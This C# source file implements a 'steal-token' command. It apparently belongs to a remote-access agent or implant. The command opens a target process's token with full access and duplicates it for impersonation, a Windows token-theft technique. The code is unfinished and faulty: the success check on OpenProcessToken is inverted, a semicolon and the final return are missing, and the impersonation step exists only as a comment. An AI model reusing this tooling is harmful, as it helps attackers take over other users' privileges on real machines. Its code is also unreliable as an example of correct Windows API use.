using Agent.Models;
using System.Diagnostics;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class StealToken:AgentsCommand
    {
        public override string Name => "steal-token";

        public override string Execute (AgentTask task)
        {   

            if(!int.TryParse(task.Arguments[0], out var pid))
                
                return "failed to parse PID";

            //open handle to process

            var hprocess = Process.GetProcessById(pid).Handle;
            //open handel to token 
            if (Native.Advapi.OpenProcessToken(hprocess, Native.Advapi.DesiredAccess.TOKEN_ALL_ACCESS, out var hToken))
                return "Failed open [rocess token";

            //duplicate token 

            var sa = new Native.Advapi.SECURITY_ATTRIBUTEs();
           if(!Native.Advapi.DuplicateTokenEx(hToken,Native.Advapi.TokenAccess.TOKEN_ALL_ACCESS ,ref sa, Native.Advapi.SecurityImpersonationLevel.SECURITY_IMPERSNATION,
                Native.Advapi.TokenType.TOKEN_IMPERSONATION,out var hTokenDup)){

                Native.Kernel32.CloseHandle(hToken)

            }

            //impersonate toke 
            //close token handles 
        }
    }
}
